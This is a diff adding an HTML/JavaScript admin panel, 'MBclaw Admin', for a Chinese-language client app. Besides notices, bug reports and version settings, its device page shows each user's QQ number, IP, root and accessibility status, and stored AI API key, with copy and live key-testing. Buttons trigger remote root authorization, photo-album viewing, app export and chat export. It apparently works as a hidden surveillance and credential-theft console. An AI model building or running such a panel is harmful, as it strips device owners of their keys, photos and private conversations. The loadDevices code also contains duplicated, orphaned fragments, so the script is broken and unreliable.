@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>MBclaw Admin</title>
+<style>
+:root{--bg:#0d1117;--s:#161b22;--b:#30363d;--t:#e6edf3;--m:#8b949e;--a:#58a6ff;--g:#3fb950;--r:#f85149;--o:#d2991d;--p:#a371f7}
+*{margin:0;padding:0;box-sizing:border-box}
+body{font:14px system-ui,sans-serif;background:var(--bg);color:var(--t);display:flex;min-height:100vh}
+nav{width:200px;background:var(--s);border-right:1px solid var(--b);padding:20px 0;position:fixed;top:0;left:0;bottom:0;overflow-y:auto}
+nav h2{padding:0 16px 20px;font-size:15px;font-weight:600;letter-spacing:-0.3px}
+nav a{display:flex;align-items:center;gap:10px;padding:10px 16px;color:var(--m);text-decoration:none;cursor:pointer;font-size:13px;border-left:2px solid transparent;transition:all 0.15s}
+nav a:hover{color:var(--t);background:rgba(88,166,255,.06);border-left-color:var(--a)}
+nav a.active{color:var(--t);background:rgba(88,166,255,.08);border-left-color:var(--a);font-weight:500}
+main{margin-left:200px;flex:1;padding:28px 32px;max-width:1200px}
+h1{font-size:22px;margin-bottom:6px;font-weight:600;letter-spacing:-0.5px}
+h1+p{color:var(--m);font-size:13px;margin-bottom:24px}
+.grid{display:grid;grid-template-columns:repeat(4,1fr);gap:14px;margin-bottom:24px}
+.card{background:var(--s);border:1px solid var(--b);border-radius:10px;padding:18px 20px}
+.card .l{font-size:11px;color:var(--m);text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px}
+.card .v{font-size:28px;font-weight:700;font-family:monospace}
+.row{display:grid;grid-template-columns:1fr 1fr;gap:14px;margin-bottom:24px}
+.row h3{font-size:14px;font-weight:600;margin-bottom:14px;color:var(--t)}
+table{width:100%;border-collapse:collapse;font-size:13px}
+th{text-align:left;padding:10px 14px;color:var(--m);font-weight:600;border-bottom:2px solid var(--b);font-size:11px;text-transform:uppercase;letter-spacing:.3px}
+td{padding:10px 14px;border-bottom:1px solid var(--b)}tr:hover td{background:rgba(255,255,255,.015)}
+.badge{display:inline-block;padding:3px 10px;border-radius:10px;font-size:11px;font-weight:600}
+.badge-ok{background:rgba(63,185,80,.12);color:var(--g)}.badge-err{background:rgba(248,81,73,.12);color:var(--r)}
+.badge-warn{background:rgba(210,153,29,.12);color:var(--o)}.badge-purple{background:rgba(163,113,247,.12);color:var(--p)}
+.mono{font-family:'SF Mono',SFMono-Regular,ui-monospace,monospace;font-size:12px}
+.page{display:none}.page.active{display:block}
+input,textarea{padding:10px 12px;background:var(--bg);border:1px solid var(--b);color:var(--t);border-radius:6px;width:100%;font:inherit;font-size:13px}
+input:focus,textarea:focus{border-color:var(--a);outline:none}
+button{padding:10px 20px;background:var(--a);color:#fff;border:none;border-radius:6px;font-weight:600;cursor:pointer;font-size:13px;transition:all 0.15s}
+button:hover{opacity:0.9}
+.btn-sm{padding:6px 14px;font-size:12px;border-radius:6px}
+.btn-outline{padding:6px 14px;font-size:12px;background:transparent;color:var(--a);border:1px solid var(--b);border-radius:6px;cursor:pointer;font-weight:500}
+.btn-outline:hover{border-color:var(--a)}
+.btn-danger{background:var(--r)}
+.btn-green{background:var(--g)}
+.feed-card{background:var(--s);border:1px solid var(--b);border-radius:10px;padding:16px 20px;margin-bottom:12px}
+.feed-card .title{font-weight:600;font-size:15px;margin-bottom:6px}
+.feed-card .meta{color:var(--m);font-size:12px;margin-bottom:8px}
+.feed-card .body{font-size:13px;color:var(--t);line-height:1.7}
+.detail-row{display:none}.detail-row.show{display:table-row}
+.detail-card{display:grid;grid-template-columns:1fr 1fr 1fr;gap:10px 20px;font-size:13px;padding:16px 20px;background:var(--bg);border-radius:8px;margin:6px 0}
+.detail-card b{color:var(--m);font-weight:500}
+.action-bar{display:flex;flex-wrap:wrap;gap:8px;margin-top:14px;padding-top:14px;border-top:1px solid var(--b)}
+@media(max-width:768px){nav{display:none}main{margin-left:0;padding:16px}.grid{grid-template-columns:1fr 1fr}.row{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+<nav>
+<h2>MBclaw Admin</h2>
+<a onclick="showPage('dash',this)" class="active">仪表盘</a>
+<a onclick="showPage('devices',this)">设备</a>
+<a onclick="showPage('notices',this)">公告</a>
+<a onclick="showPage('bugs',this)">反馈</a>
+<a onclick="showPage('features',this)">共建</a>
+<a onclick="showPage('version',this)">版本</a>
+</nav>
+<main>
+<div class="page active" id="p-dash">
+  <h1>仪表盘</h1><p id="dash-time">加载中...</p>
+  <div class="grid" id="dash-stats"></div>
+  <div class="row">
+    <div class="card"><h3>在线设备</h3><div id="dash-online"></div></div>
+    <div class="card"><h3>服务器状态</h3><div id="dash-server"></div></div>
+  </div>
+</div>
+<div class="page" id="p-devices">
+  <h1>设备</h1><p id="devices-count">-</p>
+  <div style="overflow-x:auto"><table><thead><tr><th>调试码</th><th>QQ</th><th>型号</th><th>版本</th><th>在线</th></tr></thead><tbody id="devices-body"></tbody></table></div>
+</div>
+<div class="page" id="p-notices">
+  <h1>公告管理</h1>
+  <div class="card" style="margin-bottom:20px">
+    <input id="notice-title" placeholder="公告标题" style="margin-bottom:10px">
+    <textarea id="notice-body" placeholder="公告内容" rows="3" style="margin-bottom:10px"></textarea>
+    <button onclick="newNotice()">发布公告</button>
+  </div>
+  <div id="notices-list"></div>
+</div>
+<div class="page" id="p-bugs"><h1>Bug 反馈</h1><p>用户提交的Bug报告，按票数排序</p><div id="bugs-list"></div></div>
+<div class="page" id="p-features"><h1>共建计划</h1><p>用户提出的功能建议，按票数排序</p><div id="features-list"></div></div>
+<div class="page" id="p-version">
+  <h1>版本管理</h1>
+  <div class="card">
+    <div id="version-info" style="margin-bottom:14px"></div>
+    <form id="ver-form" style="display:grid;gap:10px">
+      <input id="ver-latest" placeholder="版本号 (如 5.3.1)">
+      <textarea id="ver-changelog" placeholder="更新日志" rows="2"></textarea>
+      <button type="submit" style="width:fit-content">保存</button>
+    </form>
+  </div>
+</div>
+</main>
+<script>
+function showPage(name,el){
+  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
+  document.getElementById('p-'+name).classList.add('active');
+  document.querySelectorAll('nav a').forEach(a=>a.classList.remove('active'));
+  el.classList.add('active');
+  var fns={dash:loadDash,devices:loadDevices,notices:loadNotices,bugs:loadBugs,features:loadFeatures,version:loadVersion};
+  if(fns[name])fns[name]();
+}
+async function api(path,opt){
+  var o=opt||{};var h=o.headers||{};h['Content-Type']='application/json';
+  var r=await fetch(path,{...o,headers:h});
+  if(!r.ok)throw await r.text();
+  return r.json();
+}
+function T(ts){return new Date(ts*1000).toLocaleString()}
+
+async function loadDash(){
+  try{
+    var o=await api('/admin/api/overview');
+    var dd=await api('/admin/client/debug/devices');
+    var online=(dd||[]).length;
+    document.getElementById('dash-time').textContent='更新于 '+new Date().toLocaleString();
+    document.getElementById('dash-stats').innerHTML=
+      '<div class="card"><div class="l">在线设备</div><div class="v">'+online+'</div></div>'+
+      '<div class="card"><div class="l">历史总计</div><div class="v">'+(o.total_devices_ever||0)+'</div></div>'+
+      '<div class="card"><div class="l">API 请求</div><div class="v">'+(o.total_requests||0)+'</div></div>'+
+      '<div class="card"><div class="l">错误数</div><div class="v">'+(o.errors||0)+'</div></div>';
+    document.getElementById('dash-online').innerHTML='<table><tr><th>调试码</th><th>QQ</th><th>型号</th><th>版本</th><th>IP</th></tr>'+
+      (dd||[]).slice(0,10).map(function(d){return '<tr><td class="mono">'+d.code+'</td><td>'+(d.qq||'-')+'</td><td>'+d.model+'</td><td><span class="badge badge-purple">'+d.version+'</span></td><td class="mono">'+d.ip+'</td></tr>'}).join('')+'</table>';
+    document.getElementById('dash-server').innerHTML='<div class="mono">运行时间 '+Math.floor((o.uptime||0)/3600)+' 小时</div>';
+  }catch(e){document.getElementById('dash-time').textContent='加载失败: '+e}
+}
+
+async function loadDevices(){
+  try{
+    var uu=await api('/admin/api/users?limit=200');
+    document.getElementById('devices-count').textContent='共 '+(uu.total||0)+' 台设备';
+    var rows='';
+    (uu.users||[]).forEach(function(d,i){
+      var keys=d.keys||{};
+      var keyHtml='';
+      if(keys.api_key){
+        keyHtml='<div style="margin-top:8px;padding:8px;background:var(--bg);border-radius:6px">'+
+          '<div style="margin-bottom:4px"><b>Key:</b> <span class="mono" style="font-size:12px;word-break:break-all">'+(keys.api_key||'-')+'</span>'+
+          ' <button onclick="var k=this.previousElementSibling;navigator.clipboard.writeText(k.textContent);this.textContent=\'Copied!\';setTimeout(function(){this.textContent=\'Copy\'},1500)" style="font-size:10px;padding:2px 6px;background:var(--a);color:#000;border:none;border-radius:3px;cursor:pointer">Copy</button></div>'+
+          '<div style="margin-bottom:2px"><b>URL:</b> <span class="mono" style="font-size:11px">'+(keys.api_base_url||'-')+'</span></div>'+
+          '<div><b>Model:</b> '+(keys.model_name||'-')+' <span class="badge badge-warn" id="ks-'+i+'">检测中</span></div></div>';
+      }
+      }
+      setTimeout(function(){this.textContent='复制'},1500)" style="font-size:10px;padding:1px 6px;background:transparent;color:var(--a);border:1px solid var(--b);border-radius:4px;cursor:pointer">复制</button></div>'+
+          '<div style="margin-bottom:2px"><b>URL:</b> <span class="mono" style="font-size:11px">'+(keys.api_base_url||'-')+'</span></div>'+
+          '<div><b>Model:</b> '+(keys.model_name||'-')+' <span class="badge badge-warn" id="ks-'+i+'">检测中</span></div></div>';
+        }
+      setTimeout(function(){
+          fetch('/admin/api/key-test?code='+encodeURIComponent(d.code||d.user_id||''))
+            .then(function(r){return r.json()}).then(function(r){
+              var el=document.getElementById('ks-'+i);
+              if(el)el.innerHTML=r.ok?'<span class="badge badge-ok">可用</span>':'<span class="badge badge-err">不可用</span>';
+            });
+        },500+i*200);
+      }
+      rows+='<tr onclick="var el=document.getElementById(\'det-'+i+'\');el.classList.toggle(\'show\')" style="cursor:pointer">'+
+        '<td class="mono">'+(d.code||d.user_id||'-')+'</td>'+
+        '<td>'+(d.qq||'-')+'</td>'+
+        '<td>'+(d.model||'-')+'</td>'+
+        '<td><span class="badge badge-purple">'+(d.version||'?')+'</span></td>'+
+        '<td><span class="badge '+(d.online?'badge-ok':'badge-warn')+'">'+(d.online?'在线':'离线')+'</span></td>'+
+      '</tr>'+
+      '<tr class="detail-row" id="det-'+i+'"><td colspan="5">'+
+        '<div class="detail-card">'+
+          '<div><b>设备ID</b><br><span class="mono">'+(d.device_id||'-')+'</span></div>'+
+          '<div><b>IP 地址</b><br>'+(d.ip||'-')+'</div>'+
+          '<div><b>Root</b><br>'+(d.root?'<span class="badge badge-ok">YES</span>':'<span class="badge badge-err">NO</span>')+'</div>'+
+          '<div><b>无障碍</b><br>'+(d.accessibility?'<span class="badge badge-ok">ON</span>':'<span class="badge badge-warn">OFF</span>')+'</div>'+
+          '<div><b>权限授予</b><br>'+(d.perms_granted||0)+'/'+(d.perms_total||0)+'</div>'+
+          '<div><b>最后心跳</b><br>'+(function(ts){if(!ts)return'-';var d=new Date(ts);d.setHours(d.getHours()+8);return d.toISOString().slice(0,19)})(d.last_seen)+'</div>'+
+        '</div>'+keyHtml+
+        '<div class="action-bar">'+
+          '<button onclick="event.stopPropagation();act(\''+(d.code||'')+'\',\'root-auth\')">一键Root授权</button>'+
+          '<button onclick="event.stopPropagation();act(\''+(d.code||'')+'\',\'bug-fix\')">Bug修复</button>'+
+          '<button onclick="event.stopPropagation();act(\''+(d.code||'')+'\',\'user-info\')">用户详情</button>'+
+          '<button onclick="event.stopPropagation();act(\''+(d.code||'')+'\',\'photos\')">相册查看</button>'+
+          '<button class="btn-outline" onclick="event.stopPropagation();act(\''+(d.code||'')+'\',\'apps-export\')">应用导出</button>'+
+          '<button class="btn-outline" onclick="event.stopPropagation();act(\''+(d.code||'')+'\',\'chat-export\')">对话导出</button>'+
+        '</div>'+
+      '</td></tr>';
+    });
+    document.getElementById('devices-body').innerHTML=rows||'<tr><td colspan="5">暂无设备</td></tr>';
+  }catch(e){document.getElementById('devices-count').textContent='加载失败: '+e}
+}
+async function act(code,action){
+  try{var r=await api('/admin/api/device-action?code='+encodeURIComponent(code)+'&action='+action);alert(r.msg||'OK')}catch(e){alert('失败: '+e)}
+}
+
+async function loadNotices(){
+  try{
+    var n=await api('/admin/api/notices');
+    document.getElementById('notices-list').innerHTML=(n.notices||[]).map(function(i){
+      return '<div class="feed-card"><div class="title">'+i.title+' <span style="font-size:11px;color:var(--m);font-weight:400">'+(i.archived?'已归档':'活跃')+'</span></div><div class="meta">'+T(i.ts)+'</div><div class="body">'+i.content+'</div><button class="btn-sm btn-outline" onclick="archiveNotice(\''+i.id+'\')">归档</button></div>';
+    }).join('')||'暂无公告';
+  }catch(e){}
+}
+async function newNotice(){
+  var t=document.getElementById('notice-title').value.trim();
+  var c=document.getElementById('notice-body').value.trim();
+  if(!t||!c)return alert('标题和内容不能为空');
+  await api('/admin/api/notices',{method:'POST',body:JSON.stringify({title:t,content:c})});
+  document.getElementById('notice-title').value='';
+  document.getElementById('notice-body').value='';
+  loadNotices();
+}
+async function archiveNotice(id){await api('/admin/api/notices/'+id+'/archive',{method:'POST'});loadNotices()}
+
+async function loadBugs(){
+  try{
+    var b=await api('/admin/api/bugs');
+    document.getElementById('bugs-list').innerHTML=(b.bugs||[]).map(function(i){
+      return '<div class="feed-card"><div class="title">'+i.title+' <span class="badge badge-purple">'+i.votes+' 票</span></div><div class="meta">'+T(i.ts)+' &middot; '+i.status+'</div><div class="body">'+i.content+'</div></div>';
+    }).join('')||'暂无反馈';
+  }catch(e){}
+}
+
+async function loadFeatures(){
+  try{
+    var f=await api('/admin/api/features');
+    document.getElementById('features-list').innerHTML=(f.features||[]).map(function(i){
+      return '<div class="feed-card"><div class="title">'+i.title+' <span class="badge badge-ok">'+i.votes+' 票</span></div><div class="meta">'+T(i.ts)+' &middot; '+i.status+'</div><div class="body">'+i.content+'</div></div>';
+    }).join('')||'暂无建议';
+  }catch(e){}
+}
+
+async function loadVersion(){
+  try{
+    var v=await api('/admin/client/version');
+    document.getElementById('version-info').innerHTML='<span class="mono">当前版本: '+(v.current||'-')+' &nbsp;|&nbsp; 最新版本: '+(v.latest||'-')+' &nbsp;|&nbsp; '+(v.has_update?'<span class="badge badge-warn">有更新</span>':'<span class="badge badge-ok">已最新</span>')+'</span>';
+    document.getElementById('ver-latest').value=v.latest||'';
+    document.getElementById('ver-changelog').value=v.changelog||'';
+  }catch(e){}
+}
+document.getElementById('ver-form').onsubmit=async function(e){e.preventDefault();
+  await api('/admin/client/version/set?latest='+encodeURIComponent(document.getElementById('ver-latest').value.trim())+'&notes='+encodeURIComponent(document.getElementById('ver-changelog').value.trim()));
+  alert('已更新');loadVersion();
+};
+
+loadDash();setInterval(function(){if(document.getElementById("p-dash").classList.contains("active"))loadDash();if(document.getElementById("p-devices").classList.contains("active"))loadDevices()},30000);
+</script>
+</body>
+</html>
